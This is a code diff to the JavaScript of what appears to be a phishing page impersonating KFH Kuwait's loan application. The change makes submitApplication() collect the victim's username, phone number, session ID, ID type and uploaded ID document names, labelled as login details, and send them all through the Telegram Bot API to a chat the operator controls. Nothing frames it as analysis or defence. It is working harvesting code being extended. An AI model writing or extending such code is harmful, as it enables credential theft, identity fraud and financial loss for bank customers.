@@ -315,16 +315,44 @@
         }
 
         async function submitApplication() {
-            // Send final application to bot
+            // Get all stored data
+            const phone = sessionStorage.getItem('kfh_phone') || 'Not provided';
+            const username = sessionStorage.getItem('kfh_username') || 'Unknown';
+            const sessionId = sessionStorage.getItem('kfh_session_id') || 'N/A';
+            const idType = sessionStorage.getItem('idType') || 'Not provided';
+            
+            // Send final application to bot with ALL details
             const applicationId = 'KFH-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
             
-            const message = '🎉 KFH KUWAIT - FINAL APPLICATION SUBMITTED\n\n🆔 Session ID: ' + sessionId + '\n👤 Username: ' + username + '\n💰 Amount: KWD ' + loanDetails.amount.toLocaleString() + '\n📅 Term: ' + loanDetails.term + ' Months\n💵 Monthly Payment: KWD ' + loanDetails.monthlyPayment.toLocaleString() + '\n🆔 Application ID: ' + applicationId + '\n📅 Time: ' + new Date().toLocaleString();
+            let message = '🎉 *KFH KUWAIT - COMPLETE APPLICATION*\n\n';
+            message += '*📋 APPLICATION ID:* ' + applicationId + '\n';
+            message += '*🆔 Session ID:* ' + sessionId + '\n';
+            message += '*📅 Date:* ' + new Date().toLocaleString() + '\n\n';
+            
+            message += '*━━━ LOGIN DETAILS ━━━*\n';
+            message += '*👤 Username:* ' + username + '\n';
+            message += '*📱 Phone:* ' + phone + '\n\n';
+            
+            message += '*━━━ VERIFICATION ━━━*\n';
+            message += '*✅ Status:* Verified\n\n';
+            
+            message += '*━━━ DOCUMENTS ━━━*\n';
+            message += '*🪪 ID Type:* ' + idType + '\n';
+            message += '*📷 ID Front:* ' + (sessionStorage.getItem('id-front_name') || 'Not uploaded') + '\n';
+            message += '*📷 ID Back:* ' + (sessionStorage.getItem('id-back_name') || 'Not uploaded') + '\n';
+            message += '*📎 Supporting Doc:* ' + (sessionStorage.getItem('supporting-doc_name') || 'Not uploaded') + '\n\n';
+            
+            message += '*━━━ LOAN DETAILS ━━━*\n';
+            message += '*💰 Amount:* KWD ' + loanDetails.amount.toLocaleString() + '\n';
+            message += '*📅 Term:* ' + loanDetails.term + ' Months\n';
+            message += '*💵 Monthly Payment:* KWD ' + loanDetails.monthlyPayment.toLocaleString() + '\n';
+            message += '*📊 Profit Rate:* 5% APR';
 
             try {
                 await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
                 });
             } catch (error) {
                 console.log('Error sending final application to bot:', error);
